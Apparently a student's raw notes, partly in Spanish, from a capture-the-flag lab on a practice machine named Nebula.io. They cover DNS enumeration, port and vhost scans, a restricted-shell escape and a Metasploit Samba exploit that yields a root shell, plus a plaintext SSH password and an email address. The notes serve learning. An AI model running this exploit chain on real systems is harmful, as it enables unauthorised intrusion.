| 144.150.168.192.IN-ADDR.ARPA.nebula.io.  PTR    www.nebula.io.
| bluffer.nebula.io.                       TXT    "BLUFFER{S3cr3t_DNS_Tr4nsfer_Flag}"
| contact.nebula.io.                       TXT    "Para soporte, contactar a admin@nebula.io o llamar al +1 123 4567890"
| deadbeef.nebula.io.                      AAAA   dead:beef::1
| ftp.nebula.io.                           A      192.168.150.180
| mail.nebula.io.                          A      192.168.150.146
| ns1.nebula.io.                           A      192.168.150.144
| ns2.nebula.io.                           A      192.168.150.145
| office.nebula.io.                        A      192.0.2.10
| sip.nebula.io.                           A      192.168.150.147
| vpn.nebula.io.                           A      198.51.100.10
| www.nebula.io.                           A      192.168.150.144
| xss.nebula.io.                           TXT    "user : bluffer"
|_nebula.io.                               SOA    ns1.nebula.io. admin.nebula.io.

Nmap done: 1 IP address (1 host up) scanned in 4.35 seconds
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ dig ftp.nebula.io @10.10.162.19


; <<>> DiG 9.20.4-4-Debian <<>> ftp.nebula.io @10.10.162.19
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 341
;; flags: qr aa rd; QUERY: 1, ANSWER: 1, AUTHORITY: 2, ADDITIONAL: 3
;; WARNING: recursion requested but not available

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; udp: 4096
;; QUESTION SECTION:
;ftp.nebula.io.                 IN      A

;; ANSWER SECTION:
ftp.nebula.io.          7200    IN      A       192.168.150.180

;; AUTHORITY SECTION:
nebula.io.              86400   IN      NS      ns1.nebula.io.
nebula.io.              86400   IN      NS      ns2.nebula.io.

;; ADDITIONAL SECTION:
ns1.nebula.io.          86400   IN      A       192.168.150.144
ns2.nebula.io.          86400   IN      A       192.168.150.145

;; Query time: 47 msec
;; SERVER: 10.10.162.19#53(10.10.162.19) (UDP)
;; WHEN: Thu Apr 10 09:17:02 EDT 2025
;; MSG SIZE  rcvd: 126

──(kali㉿kali)-[~]
└─$ nmap -A -T4 -p- --osscan-guess --version-all --script=default,safe 192.168.150.180
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-10 12:00 EDT
No profinet devices in the subnet
Pre-scan script results:
| targets-asn: 
|_  targets-asn.asn is a mandatory parameter
| broadcast-ping: 
|   IP: 192.168.193.2  MAC: 00:50:56:eb:54:28
|_  Use --script-args=newtargets to add the results as targets
| broadcast-listener: 
|   ether
|       ARP Request
|         sender ip      sender mac         target ip
|         192.168.193.2  00:50:56:eb:54:28  192.168.193.133
|       EIGRP Update
|         
|   udp
|       MDNS
|         Generic
|           ip             ipv6                      name
|           192.168.193.1  fe80::f86f:d9ad:6679:969  _dosvc._tcp.local
|           192.168.193.1  fe80::f86f:d9ad:6679:969  DESKTOP-6K2BSHA._dosvc._tcp.local
|       DHCP
|         srv ip           cli ip           mask           gw             dns            vendor
|_        192.168.193.254  192.168.193.133  255.255.255.0  192.168.193.2  192.168.193.2  -
|_http-robtex-shared-ns: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
| broadcast-igmp-discovery: 
|   192.168.193.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.251
|     Description: mDNS (rfc6762)
|   192.168.193.1
|     Interface: eth0
|     Version: 2
|     Group: 224.0.0.252
|     Description: Link-local Multicast Name Resolution (rfc4795)
|   192.168.193.1
|     Interface: eth0
|     Version: 2
|     Group: 239.255.255.250
|     Description: Organization-Local Scope (rfc2365)
|_  Use the newtargets script-arg to add the results as targets
| broadcast-dhcp-discover: 
|   Response 1 of 1: 
|     Interface: eth0
|     IP Offered: 192.168.193.133
|     Server Identifier: 192.168.193.254
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.193.2
|     Domain Name Server: 192.168.193.2
|     Domain Name: localdomain
|     Broadcast Address: 192.168.193.255
|_    NetBIOS Name Server: 192.168.193.2
|_hostmap-robtex: *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/
|_eap-info: please specify an interface with -e
|_multicast-profinet-discovery: 0
Nmap scan report for bluffer.nebula.io (192.168.150.180)
Host is up (0.0017s latency).
Not shown: 65533 filtered tcp ports (no-response)
Bug in http-security-headers: no string output.
PORT    STATE SERVICE    VERSION
80/tcp  open  tcpwrapped
| http-useragent-tester: 
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
|_http-mobileversion-checker: No mobile version detected.
|_http-xssed: No previously reported XSS vuln.
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_http-comments-displayer: Couldn't find any comments.
|_unusual-port: tcpwrapped unexpected on port tcp/80
|_http-fetch: Please enter the complete path of the directory to save data in.
443/tcp open  tcpwrapped
|_http-referer-checker: Couldn't find any cross-domain scripts.
|_ssl-ccs-injection: No reply from server (TIMEOUT)
|_http-mobileversion-checker: No mobile version detected.
|_http-xssed: No previously reported XSS vuln.
|_http-comments-displayer: Couldn't find any comments.
| http-useragent-tester: 
|   Allowed User Agents: 
|     Mozilla/5.0 (compatible; Nmap Scripting Engine; https://nmap.org/book/nse.html)
|     libwww
|     lwp-trivial
|     libcurl-agent/1.0
|     PHP/
|     Python-urllib/2.5
|     GT::WWW
|     Snoopy
|     MFC_Tear_Sample
|     HTTP::Lite
|     PHPCrawl
|     URI::Fetch
|     Zend_Http_Client
|     http client
|     PECL::HTTP
|     Wget/1.13.4 (linux-gnu)
|_    WWW-Mechanize/1.34
| http-security-headers: 
|   Strict_Transport_Security: 
|_    HSTS not configured in HTTPS Server
|_unusual-port: tcpwrapped unexpected on port tcp/443
|_http-fetch: Please enter the complete path of the directory to save data in.
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Actiontec MI424WR-GEN3I WAP (97%), DD-WRT v24-sp2 (Linux 2.4.37) (97%), Microsoft Windows XP SP3 or Windows 7 or Windows Server 2012 (97%), Linux 3.2 (95%), Microsoft Windows XP SP3 (95%), VMware Player virtual NAT device (95%), Linux 4.4 (92%), BlueArc Titan 2100 NAS device (90%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops

Host script results:
| dns-blacklist: 
|   SPAM
|     l2.apews.org - FAIL
|_    all.spamrats.com - FAIL
| qscan: 
| PORT  FAMILY  MEAN (us)  STDDEV    LOSS (%)
| 80    0       16189.80   30864.58  0.0%
|_443   0       5561.70    1664.68   0.0%
|_path-mtu: PMTU == 1500
| firewalk: 
| HOP  HOST           PROTOCOL  BLOCKED PORTS
|_1    192.168.193.2  tcp       1-10
|_ipidseq: Unknown
|_fcrdns: FAIL (No PTR record)
| traceroute-geolocation: 
|   HOP  RTT   ADDRESS                              GEOLOCATION
|   1    0.19  192.168.193.2                        - ,- 
|_  2    0.20  bluffer.nebula.io (192.168.150.180)  - ,- 
| port-states: 
|   tcp: 
|     open: 80,443
|_    filtered: 1-79,81-442,444-65535

TRACEROUTE (using port 80/tcp)
HOP RTT     ADDRESS 
1   0.19 ms 192.168.193.2
2   0.20 ms bluffer.nebula.io (192.168.150.180)

Post-scan script results:
| reverse-index: 
|   80/tcp: 192.168.150.180
|_  443/tcp: 192.168.150.180
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 895.70 seconds
                                                                               

gobuster vhost -u "http://10.10.226.56" --domain nebula.io -w /usr/share/wordlists/dirb/small.txt --append-domain --exclude-length 250-320 

──(kali㉿kali)-[~]
└─$ gobuster vhost -u "http://10.10.162.19" --domain nebula.io -w /usr/share/wordlists/dirb/small.txt --append-domain --exclude-length 250-320

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:              http://10.10.162.19
[+] Method:           GET
[+] Threads:          10
[+] Wordlist:         /usr/share/wordlists/dirb/small.txt
[+] User Agent:       gobuster/3.6
[+] Timeout:          10s
[+] Append Domain:    true
[+] Exclude Length:   297,263,252,257,259,260,293,315,320,299,316,317,262,281,284,295,306,314,282,286,307,277,261,251,255,294,264,268,274,275,279,292,298,305,253,278,308,310,256,269,301,265,266,272,280,270,271,276,287,291,300,254,285,313,250,289,302,309,311,288,304,312,267,290,303,319,296,318,258,273,283
===============================================================
Starting gobuster in VHOST enumeration mode
===============================================================
Found: @.nebula.io Status: 400 [Size: 349]
Found: INSTALL_admin.nebula.io Status: 400 [Size: 349]
Found: Admin.nebula.io Status: 200 [Size: 2369]
Found: _pages.nebula.io Status: 400 [Size: 349]
Found: _admin.nebula.io Status: 400 [Size: 349]
Found: admin.nebula.io Status: 200 [Size: 2369]
Found: admin_.nebula.io Status: 400 [Size: 349]
Found: admin_login.nebula.io Status: 400 [Size: 349]
Found: admin_logon.nebula.io Status: 400 [Size: 349]
Found: cgi-bin/.nebula.io Status: 400 [Size: 349]
Found: index_admin.nebula.io Status: 400 [Size: 349]
Found: index_adm.nebula.io Status: 400 [Size: 349]
Found: lost%2Bfound.nebula.io Status: 400 [Size: 349]
Found: server_stats.nebula.io Status: 400 [Size: 349]
Found: ~adm.nebula.io Status: 400 [Size: 349]
Found: ~admin.nebula.io Status: 400 [Size: 349]
Found: ~bin.nebula.io Status: 400 [Size: 349]
Found: ~guest.nebula.io Status: 400 [Size: 349]
Found: ~ftp.nebula.io Status: 400 [Size: 349]
Found: ~administrator.nebula.io Status: 400 [Size: 349]
Found: ~mail.nebula.io Status: 400 [Size: 349]
Found: ~sys.nebula.io Status: 400 [Size: 349]
Found: ~root.nebula.io Status: 400 [Size: 349]
Found: ~operator.nebula.io Status: 400 [Size: 349]
Found: ~sysadmin.nebula.io Status: 400 [Size: 349]
Found: ~sysadm.nebula.io Status: 400 [Size: 349]
Found: ~test.nebula.io Status: 400 [Size: 349]
Found: ~user.nebula.io Status: 400 [Size: 349]
Found: ~webmaster.nebula.io Status: 400 [Size: 349]
Found: ~www.nebula.io Status: 400 [Size: 349]

===============================================================
Finished
===============================================================


http://admin.nebula.io/

22d04f665519fd8091f873476b0b4be4ad02abe10c610b1f81611b7cc37d6146

git config
git config --global user.name Maribel0370
git config --global user.mail chipyblue0370@gmail.com

git show 2c5973d

┌──(kali㉿kali)-[/var/www/html/Nebula_io]
└─$ git log --graph --oneline --all
* a7ed9bd (HEAD -> main) Finished
* 310ff91 Integrated Validator
| * 3b5c46d (dbinit) Checked Validator
| * f4c95ca Check Validator
| * a18082c Cipher Validator
| * d7fac4f Ups
| * 9255c87 Init Validator
|/  
* c4bb5d6 Change Project
* 2c5973d Initial Project

MaribelGaCIEF
alumne15@grupcief.com

T1543.003
cuando nos metemos en un proceso de la maquina

┌──(kali㉿kali)-[~]
└─$ ssh bluffer@10.10.33.174 -p 1986

===================================================
| Bienvenido de nuevo Mr.X  al servidor Nebula.io |
|                                                 |
| Acceso autorizado solo para usuarios registrado |
|      Todas las actividades son monitoreadas     |
===================================================

maribel@10.10.146.27's password: 
Permission denied, please try again.
maribel@10.10.146.27's password: 
Permission denied, please try again.
maribel@10.10.146.27's password: 
maribel@10.10.146.27: Permission denied (publickey,password).

┌──(kali㉿kali)-[~]
└─$ ssh bluffer@10.10.33.174 -p 1986


===================================================
| Bienvenido de nuevo Mr.X  al servidor Nebula.io |
|                                                 |
| Acceso autorizado solo para usuarios registrado |
|      Todas las actividades son monitoreadas     |
===================================================

bluffer@10.10.37.80's password: w.v2rLTM7


===============================================================================

░▒▓███████▓▒░░▒▓████████▓▒░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░       ░▒▓██████▓▒░ 
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓██████▓▒░ ░▒▓███████▓▒░░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓████████▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░░▒▓█▓▒░▒▓█▓▒░      ░▒▓█▓▒░░▒▓█▓▒░
░▒▓█▓▒░░▒▓█▓▒░▒▓████████▓▒░▒▓███████▓▒░ ░▒▓██████▓▒░░▒▓████████▓▒░▒▓█▓▒░░▒▓█▓▒░

===============================================================================

~$ PLAY THE GAME | START_BLUFFER |
~$ HELP | help |

bluffer@Nebula-server:~$ 


┌──(kali㉿kali)-[~]
└─$ dig admin.nebula.io


; <<>> DiG 9.20.4-4-Debian <<>> admin.nebula.io
;; global options: +cmd
;; Got answer:
;; ->>HEADER<<- opcode: QUERY, status: NOERROR, id: 55713
;; flags: qr rd ra; QUERY: 1, ANSWER: 2, AUTHORITY: 0, ADDITIONAL: 1

;; OPT PSEUDOSECTION:
; EDNS: version: 0, flags:; MBZ: 0x0005, udp: 1220
; COOKIE: 21fa208d3f549704103f126767fa44a52810ccce5930a6b4 (good)
;; QUESTION SECTION:
;admin.nebula.io.               IN      A

;; ANSWER SECTION:
admin.nebula.io.        5       IN      A       13.248.213.45
admin.nebula.io.        5       IN      A       76.223.67.189

;; Query time: 84 msec
;; SERVER: 192.168.21.2#53(192.168.21.2) (UDP)
;; WHEN: Sat Apr 12 06:47:02 EDT 2025
;; MSG SIZE  rcvd: 104

bluffer@Nebula-server:~$ PLAY THE GAME
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
[Restricted Permission]
bluffer@Nebula-server:~$ HELP
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
[Restricted Permission]
bluffer@Nebula-server:~$ STAR_BLUFFER
-rbash: /usr/lib/command-not-found: restricted: cannot specify `/' in command names
[Restricted Permission]
bluffer@Nebula-server:~$ help


=======================================
           Ayuda de Nebula

 1. Inicia el juego con: START_BLUFFER

 2. Escapa de los ENEMIGOS E con tu @  
 3. Recoge todos los coleccionables *  
 4.      UP | DOWN | LEFT | RIGHT      


 Server Transfer File SMB : OPEN_SMB   

=======================================

Terminado el juego conecto a través de SMB con el servidor

bluffer@Nebula-server:~$ OPEN_SMB
Starting Samba services...
bluffer@Nebula-server:~$ ls la
[Restricted Permission]
bluffer@Nebula-server:~$ ls -la
[Restricted Permission]
bluffer@Nebula-server:~$ compgen -c para listar los comandos disponibles


bluffer@Nebula-server:~$ START_BLUFFER 
.bash_history  .bash_logout   .bashrc        .cache/        cmds/          .hushlogin     .profile
bluffer@Nebula-server:~$ START_BLUFFER 
.bash_history  .bash_logout   .bashrc        .cache/        cmds/          .hushlogin     .profile
bluffer@Nebula-server:~$ cd /home/bluffer/cmds/
bluffer@Nebula-server:~/cmds$ ./START_BLUFFER

bluffer@Nebula-server:~$ 
Display all 106 possibilities? (y or n)
:                         continue                  history                   shopt
!                         coproc                    if                        source
./                        cp                        in                        START_BLUFFER
[                         declare                   jobs                      sudo
[[                        dirs                      kill                      suspend
]]                        disown                    la                        tee
{                         do                        let                       test
}                         done                      local                     then
alias                     echo                      logout                    time
bash                      elif                      ls                        times
bg                        else                      man                       top
bind                      enable                    mapfile                   touch
bluffer                   esac                      more                      trap
break                     eval                      mv                        true
builtin                   exec                      OPEN_SMB                  type
caller                    exit                      popd                      typeset
case                      export                    printf                    ulimit
cat                       false                     pushd                     umask
cd                        fc                        pwd                       unalias
chmod                     fg                        read                      uname
chown                     fi                        readarray                 unset
clear                     for                       readonly                  until
command                   function                  return                    wait
command_not_found_handle  getopts                   rm                        while
compgen                   grep                      select                    whoami
complete                  hash                      set                       
compopt                   help                      shift                     


Después de terminar el juego y tras intentar varias cosas con la barra espaciadora y las flechas de dirección consigo acceder/romper el inicio del juego accediendo al juego y la informacion información 

Captura de pantalla
***************************************
*                                     *
*         NEBULA.IO PRESENTA          *
*              BLUFFER                *
*                                     *
***************************************

   Un viaje a través de las mazmorras   
       Cargando, por favor espera       

.

Carga interrumpida. Fallo en el sistema
-e 
###
-e 
 RYUK V0.02a2 


HANDLER RANSOMWARE FILE
...
EXEC CODING

-e 

...

-e 

[*] Connecting to server 10.10.6PmP.@*x4
[*] Connected ...
[*] Authenticating user : fyc5QNQ0twf*mjc2ebr
[*] Authentication successful.
[*] Accessing server resources : kvd2MAV@vxk4mcg!ecv
[*] Downloading sensitive data : pdAFihaBYt6@*x4-T6Qqvq8ph.6PmP
[*] GET /admin/config/settings HTTP/1.1
[*] Host: 127.0.0.1
[*] Hostname: Nebula Server Kernel
[*] Authorization: Bearer : <token> CJcKuhwvsYKx3g9-yM.LwGfJEqXT.2u8co_Cid!.bW8ii8np7_KEgDFegEh34F-F42a6QTEmbPyTg </token>
[*] Data received from server :
---------------------------
root::0:0:root:/root:/bin/bash
admin:x:1:1:admin:/admin:/bin/sh
---------------------------
[*] Injecting malicious code
[*] Sending payload ...
[*] POST /admin/upload HTTP/1.1
[*] Content-Type: application/x-www-form-urlencoded
[*] Payload:
-e 

[*] Payload successfully deployed
[*] Encrypted Server ...
-e 


bluffer@Nebula-server:~$ Starting Samba services...

[*] Connecting to server 10.10.6PmP.@*x4
[*] Connected ...
[*] Authenticating user : fyc5QNQ0twf*mjc2ebr
[*] Authentication successful.
[*] Accessing server resources : kvd2MAV@vxk4mcg!ecv
[*] Downloading sensitive data : pdAFihaBYt6@*x4-T6Qqvq8ph.6PmP
[*] GET /admin/config/settings HTTP/1.1
[*] Host: 127.0.0.1
[*] Hostname: Nebula Server Kernel
[*] Authorization: Bearer : <token> CJcKuhwvsYKx3g9-yM.LwGfJEqXT.2u8co_Cid!.bW8ii8np7_KEgDFegEh34F-F42a6QTEmbPyTg </token>
[*] Data received from server :
---------------------------
root::0:0:root:/root:/bin/bash
admin:x:1:1:admin:/admin:/bin/sh
---------------------------
[*] Injecting malicious code
[*] Sending payload ...

                                     
  

Para el ejercicio 8

┌──(kali㉿kali)-[~]
└─$ nmap -p- --min-rate 10000 -T4 10.10.230.185
Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 12:41 EDT
Warning: 10.10.230.185 giving up on port because retransmission cap hit (6).
Nmap scan report for 10.10.230.185
Host is up (0.096s latency).
Not shown: 65531 closed tcp ports (reset)
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
1986/tcp  open  licensedaemon
44544/tcp open  domiq

Nmap done: 1 IP address (1 host up) scanned in 11.58 seconds
                                                                                                                          
┌──(kali㉿kali)-[~]
└─$ nmap -sV -p 44544 10.10.230.185

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 12:44 EDT
Stats: 0:00:45 elapsed; 0 hosts completed (1 up), 1 undergoing Service Scan
Service scan Timing: About 0.00% done
Nmap scan report for 10.10.230.185
Host is up (0.064s latency).

PORT      STATE SERVICE     VERSION
44544/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: NEBULA_ROCKS)
Service Info: Host: NEBULA-SERVER

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.72 seconds

┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.230.185 -p 44544 -N


        Sharename       Type      Comment
        ---------       ----      -------
        nebula_share    Disk      
        IPC$            IPC       IPC Service (Nebula.io File Tansfer Server)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.230.185 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~]
└─$ smbclient //10.10.230.185/nebula_share -p 44544 -N

Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Wed Apr  9 04:33:52 2025
  ..                                  D        0  Fri Oct 25 12:43:58 2024

                10900304 blocks of size 1024. 8408392 blocks available
smb: \> ls -a
NT_STATUS_NO_SUCH_FILE listing \-a
smb: \> 

┌──(kali㉿kali)-[~]
└─$ enum4linux -p -U 10.10.230.185 -smbport 44544

Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Sun Apr 13 14:10:38 2025

 =========================================( Target Information )=========================================
                                                                                                                          
Target ........... 10.10.230.185                                                                                          
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... '-U'
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none


 ===========================( Enumerating Workgroup/Domain on 10.10.230.185 )===========================
                                                                                                                          
                                                                                                                          
[+] Got domain/workgroup name: NEBULA_ROCKS                                                                               
                                                                                                                          
                                                                                                                          
 ===================================( Session Check on 10.10.230.185 )===================================
                                                                                                                          
                                                                                                                          
[E] Server doesn't allow session using username '', password '-U'.  Aborting remainder of tests.           

┌──(kali㉿kali)-[~]
└─$ smbclient -L //10.10.230.185 -p 44544 -N

        Sharename       Type      Comment
        ---------       ----      -------
        nebula_share    Disk      
        IPC$            IPC       IPC Service (Nebula.io File Tansfer Server)
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.230.185 failed (Error NT_STATUS_CONNECTION_REFUSED)
Unable to connect with SMB1 -- no workgroup available

┌──(kali㉿kali)-[~]
└─$ nmap -p 44544 10.10.33.174

Starting Nmap 7.95 ( https://nmap.org ) at 2025-04-13 16:24 EDT
Nmap scan report for 10.10.33.174
Host is up (0.065s latency).

PORT      STATE SERVICE
44544/tcp open  domiq

Nmap done: 1 IP address (1 host up) scanned in 0.26 seconds
                                                           
               
                                                                                                    
msf6 exploit(linux/samba/is_known_pipename) > exploit
[*] 10.10.33.174:44544 - Using location \\10.10.33.174\nebula_share\ for the path
[*] 10.10.33.174:44544 - Retrieving the remote path of the share 'nebula_share'
[*] 10.10.33.174:44544 - Share 'nebula_share' has server-side path '/srv/samba/share
[*] 10.10.33.174:44544 - Uploaded payload to \\10.10.33.174\nebula_share\EOIEcCtn.so
[*] 10.10.33.174:44544 - Loading the payload from server-side path /srv/samba/share/EOIEcCtn.so using \\PIPE\/srv/samba/share/EOIEcCtn.so...
[-] 10.10.33.174:44544 -   >> Failed to load STATUS_OBJECT_NAME_NOT_FOUND
[*] 10.10.33.174:44544 - Loading the payload from server-side path /srv/samba/share/EOIEcCtn.so using /srv/samba/share/EOIEcCtn.so...
[+] 10.10.33.174:44544 - Probe response indicates the interactive payload was loaded...
[*] Found shell.
[*] Command shell session 1 opened (10.8.105.111:33979 -> 10.10.33.174:44544) at 2025-04-13 16:46:42 -0400


whoami
root
uname -a
Linux Nebula-server 4.4.0-142-generic #168~14.04.1-Ubuntu SMP Sat Jan 19 11:26:28 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

lsb_release -a
No LSB modules are available.
Distributor ID: Ubuntu
Description:    Ubuntu 14.04.6 LTS
Release:        14.04
Codename:       trusty
df -h
Filesystem      Size  Used Avail Use% Mounted on
udev            482M  4.0K  482M   1% /dev
tmpfs           100M  316K   99M   1% /run
/dev/dm-0        11G  1.9G  8.1G  19% /
none            4.0K     0  4.0K   0% /sys/fs/cgroup
none            5.0M     0  5.0M   0% /run/lock
none            496M     0  496M   0% /run/shm
none            100M     0  100M   0% /run/user
/dev/xvda1      234M   41M  181M  19% /boot
free -h
             total       used       free     shared    buffers     cached
Mem:          990M       285M       705M       320K        13M       186M
-/+ buffers/cache:        86M       904M
Swap:         4.0G         0B       4.0G
cat ~/.bash_history
cat: ~/.bash_history: No such file or directory
ls -l /home
total 8
drwxr-x--- 4 bluffer   bluffer   4096 Apr  9 15:27 bluffer
drwxr-xr-x 3 guakamole guakamole 4096 Apr  9 15:40 guakamole
netstat -tulnp  # Para ver los puertos abiertos y las conexiones activas
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      1049/lighttpd   
tcp        0      0 10.10.33.174:53         0.0.0.0:*               LISTEN      977/named       
tcp        0      0 127.0.0.1:53            0.0.0.0:*               LISTEN      977/named       
tcp        0      0 127.0.0.1:953           0.0.0.0:*               LISTEN      977/named       
tcp        0      0 0.0.0.0:44544           0.0.0.0:*               LISTEN      1363/smbd       
tcp        0      0 0.0.0.0:1986            0.0.0.0:*               LISTEN      861/sshd        
tcp6       0      0 :::53                   :::*                    LISTEN      977/named       
tcp6       0      0 ::1:953                 :::*                    LISTEN      977/named       
tcp6       0      0 :::44544                :::*                    LISTEN      1363/smbd       
tcp6       0      0 :::1986                 :::*                    LISTEN      861/sshd        
udp        0      0 0.0.0.0:63377           0.0.0.0:*                           609/dhclient    
udp        0      0 10.10.33.174:53         0.0.0.0:*                           977/named       
udp        0      0 127.0.0.1:53            0.0.0.0:*                           977/named       
udp        0      0 0.0.0.0:68              0.0.0.0:*                           609/dhclient    
udp        0      0 10.10.255.255:137       0.0.0.0:*                           1365/nmbd       
udp        0      0 10.10.33.174:137        0.0.0.0:*                           1365/nmbd       
udp        0      0 0.0.0.0:137             0.0.0.0:*                           1365/nmbd       
udp        0      0 10.10.255.255:138       0.0.0.0:*                           1365/nmbd       
udp        0      0 10.10.33.174:138        0.0.0.0:*                           1365/nmbd       
udp        0      0 0.0.0.0:138             0.0.0.0:*                           1365/nmbd       
udp6       0      0 :::54021                :::*                                609/dhclient    
udp6       0      0 :::53                   :::*                                977/named       
find / -name "*.conf" 2>/dev/null  # Buscar archivos de configuración

/run/resolvconf/resolv.conf
/usr/local/samba/etc/smb.conf
/usr/local/samba/share/setup/slapd.conf
/usr/local/samba/share/setup/krb5.conf
/usr/local/samba/share/setup/olc_syncrepl.conf
/usr/local/samba/share/setup/mmr_syncrepl.conf
/usr/local/samba/share/setup/memberof.conf
/usr/local/samba/share/setup/refint.conf
/usr/local/samba/share/setup/olc_mmr.conf
/usr/local/samba/share/setup/named.conf
/usr/local/samba/share/setup/olc_syncrepl_seed.conf
/usr/local/samba/share/setup/olc_serverid.conf
/usr/local/samba/share/setup/modules.conf
/usr/local/samba/share/setup/mmr_serverids.conf
/usr/src/linux-headers-4.4.0-142-generic/include/config/auto.conf
/usr/src/linux-headers-4.4.0-142-generic/include/config/tristate.conf
/usr/lib/x86_64-linux-gnu/mesa/ld.so.conf
/usr/lib/tmpfiles.d/xconsole.conf
/usr/lib/tmpfiles.d/lighttpd.tmpfile.conf
/usr/lib/tmpfiles.d/sshd.conf
/usr/lib/tmpfiles.d/bind9.conf
/usr/share/base-files/nsswitch.conf
/usr/share/initramfs-tools/event-driven/upstart-jobs/mountall.conf
/usr/share/byobu/keybindings/tmux-screen-keys.conf
/usr/share/rsyslog/50-default.conf
/usr/share/libc-bin/nsswitch.conf
/usr/share/debconf/debconf.conf
/usr/share/popularity-contest/default.conf
/usr/share/adduser/adduser.conf
/usr/share/ufw/ufw.conf
/usr/share/doc/rsync/examples/rsyncd.conf
/usr/share/doc/procps/examples/sysctl.conf
/usr/share/doc/wpasupplicant/examples/wpa-roam.conf
/usr/share/doc/wpasupplicant/examples/plaintext.conf
/usr/share/doc/wpasupplicant/examples/udhcpd-p2p.conf
/usr/share/doc/wpasupplicant/examples/ieee8021x.conf
/usr/share/doc/wpasupplicant/examples/wpa2-eap-ccmp.conf
/usr/share/doc/wpasupplicant/examples/wep.conf
/usr/share/doc/wpasupplicant/examples/wpa-psk-tkip.conf
/usr/share/doc/wpasupplicant/examples/openCryptoki.conf
/usr/share/doc/python-configobj/docs/docutils.conf
/usr/share/doc/apt-utils/examples/apt-ftparchive.conf
/usr/share/doc/adduser/examples/adduser.local.conf.examples/adduser.conf
/usr/share/doc/adduser/examples/adduser.local.conf
/usr/share/doc/apt/examples/apt.conf
/usr/share/doc/sudo/examples/sample.sudo.conf
/usr/share/doc/sudo/examples/sample.syslog.conf
/usr/share/doc/busybox-static/examples/mdev_fat.conf
/usr/share/doc/busybox-static/examples/mdev.conf
/usr/share/doc/memtest86+/examples/lilo.conf
/usr/share/doc/tmux/examples/t-williams.conf
/usr/share/doc/tmux/examples/n-marriott.conf
/usr/share/doc/tmux/examples/screen-keys.conf
/usr/share/doc/tmux/examples/h-boetes.conf
/usr/share/doc/tmux/examples/vim-keys.conf
/usr/share/upstart/sessions/xsession-init.conf
/usr/share/upstart/sessions/upstart-dbus-session-bridge.conf
/usr/share/upstart/sessions/logrotate.conf
/usr/share/upstart/sessions/re-exec.conf
/usr/share/upstart/sessions/upstart-event-bridge.conf
/usr/share/upstart/sessions/upstart-dbus-system-bridge.conf
/usr/share/upstart/sessions/ssh-agent.conf
/usr/share/upstart/sessions/dbus.conf
/usr/share/upstart/sessions/upstart-file-bridge.conf
/etc/resolv.conf
/etc/lvm/lvm.conf
/etc/blkid.conf
/etc/dbus-1/system.conf
/etc/dbus-1/session.conf
/etc/dbus-1/system.d/Upstart.conf
/etc/dbus-1/system.d/com.ubuntu.SoftwareProperties.conf
/etc/dbus-1/system.d/org.freedesktop.PolicyKit1.conf
/etc/dbus-1/system.d/org.freedesktop.Accounts.conf
/etc/dbus-1/system.d/com.ubuntu.LanguageSelector.conf
/etc/dbus-1/system.d/org.debian.AptXapianIndex.conf
